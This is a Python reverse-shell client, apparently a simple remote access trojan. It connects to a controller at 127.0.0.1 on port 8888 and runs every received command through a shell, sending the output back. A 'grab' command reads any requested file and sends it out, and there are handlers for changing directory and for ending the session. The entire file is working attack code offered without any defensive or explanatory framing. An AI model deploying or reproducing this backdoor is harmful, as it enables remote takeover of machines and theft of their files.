import socket
import subprocess
import os


def transfer(conn, path):

    if os.path.exists(path):
        f = open(path, 'rb')
        FileSize = os.path.getsize(path)
        conn.send(str(FileSize).encode())
        packet = f.read(FileSize)
        conn.send(packet)
        f.close()

    else:
        conn.send('512'.encode())
        conn.send('[-]Path/FileAccessError'.encode())


def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 8888))

    while True:
        command = client.recv(1024).decode('utf-8')

        if command == "terminate":
            client.close()
            break
        
        elif command == 'exit' or command == 'exit()':
            client.close()
            break
        
        elif 'grab' in command:
            grab, path = command.split(' ',1)

            try:
                transfer(client, path)
                
            except:
                client.send('512'.encode())
                client.send("[-]ErrorTransferringFile".encode())
                pass
            
        else:
            
            if command == 'cd':
                client.send(str.encode(os.getcwd() + '> '))
                pass
            
            elif command[:2] == 'cd':
                try:
                    
                    if command == 'cd ..':
                        os.chdir(command[3:])
                    elif command == 'cd..':
                        os.chdir(command[2:])
                    elif command[2] == ' ':
                            os.chdir(command[3:])
                            client.send('[+] \n'.encode())
                    else:
                        client.send("[!]you mean 'cd..' or 'cd ..' \n ".encode())

                except Exception as e:
                    client.send(('\n' + str(e) + '\n').encode())

            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            
            if command != 'cd..' and command != 'cd ..' and command != 'cd' and command != 'ls':
                client.send(CMD.stdout.read())
            if command != 'cd' and command != 'ls':
                client.send(str.encode(os.getcwd()+'> '))

def main():
    connect()


main()
